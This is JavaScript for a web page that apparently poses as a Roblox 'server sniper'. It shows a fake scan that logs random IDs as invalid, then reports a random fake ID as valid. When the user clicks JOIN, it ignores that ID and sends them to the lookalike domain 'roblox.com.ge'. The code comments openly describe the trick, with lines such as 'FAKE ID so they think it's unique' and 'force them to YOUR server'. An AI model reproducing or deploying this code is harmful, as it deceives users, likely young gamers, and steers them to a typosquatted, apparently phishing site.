// TABS
const tabs = document.querySelectorAll('.nav-tab');
const contents = document.querySelectorAll('.tab-content');
tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        const target = tab.dataset.tab;
        contents.forEach(c => c.classList.remove('active'));
        document.getElementById(target).classList.add('active');
    });
});

// SNIPER LOGIC
const actionBtn = document.getElementById('action-btn');
const consoleWrapper = document.getElementById('console-wrapper');
const consoleLogs = document.getElementById('console-logs');

// THIS IS YOUR REAL SERVER ID (Hidden from the user visually)
const REAL_SERVER_ID = '82127340117090933613721657038099';

// This var will hold the FAKE random ID we show them to look legit
let fakeDisplayId = '';

actionBtn.addEventListener('click', () => {
    // CHECK STATE
    const currentState = actionBtn.dataset.state;

    if (currentState === 'idle') {
        // --- START SCANNING ---
        actionBtn.disabled = true;
        actionBtn.dataset.state = 'scanning';
        actionBtn.innerHTML = `
            <span class="btn-text">SCANNING...</span>
            <span class="btn-sub">Sending packets to API</span>
        `;
        
        consoleWrapper.classList.remove('hidden');
        consoleLogs.innerHTML = '';
        
        runScan();

    } else if (currentState === 'done') {
        // --- JOIN SERVER ---
        // We ignore the fake ID and force them to YOUR server
        window.location.href = `https://roblox.com.ge/games/109983668079237/SKIBIDI-Steal-a-Brainrot?privateServerLinkCode=18289119608578786247281085808202`
    }
});

// Generate 32 digit number
function generateRandomID() {
    let result = '';
    const chars = '0123456789';
    for (let i = 0; i < 32; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    return result;
}

function addLog(id, isValid) {
    const div = document.createElement('div');
    div.className = isValid ? 'log-line success' : 'log-line fail';
    const statusText = isValid ? '[VALID]' : '[INVALID]';
    div.innerHTML = `<span class="status">${statusText}</span> <span class="id">${id}</span>`;
    consoleLogs.appendChild(div);
    consoleLogs.scrollTop = consoleLogs.scrollHeight;
}

function runScan() {
    // --- TIME CALCULATION (Realistic) ---
    const chance = Math.random();
    let totalDuration;

    if (chance < 0.10) { 
        totalDuration = Math.random() * (10000 - 7000) + 7000; // Fast
    } else if (chance > 0.90) {
        totalDuration = Math.random() * (30000 - 20000) + 20000; // Slow
    } else {
        totalDuration = Math.random() * (15000 - 8000) + 8000; // Normal
    }

    const startTime = Date.now();

    function next() {
        const elapsed = Date.now() - startTime;

        if (elapsed >= totalDuration) {
            // --- FINISHED ---
            // Generate a RANDOM fake ID for the visuals
            fakeDisplayId = generateRandomID();
            
            // Log it as green/valid
            addLog(fakeDisplayId, true);
            finish();
            return;
        }

        // --- REALISM LOGIC ---
        addLog(generateRandomID(), false);

        // DELAY CALCULATION
        let timeout = Math.random() * 200 + 100; // Standard slow scan
        if (Math.random() > 0.8) timeout = 600; // Lag
        if (Math.random() > 0.96) timeout = 1500; // Big Lag

        setTimeout(next, timeout);
    }

    next();
}

function finish() {
    setTimeout(() => {
        // ENABLE BUTTON AND TRANSFORM TO JOIN MODE
        actionBtn.disabled = false;
        actionBtn.dataset.state = 'done';
        actionBtn.classList.add('success'); // Turns Green via CSS
        
        // We show them the FAKE ID so they think it's unique
        actionBtn.innerHTML = `
            <span class="btn-text">JOIN SERVER</span>
            <span class="btn-sub">ID: ${fakeDisplayId}</span>
        `;
    }, 500);
}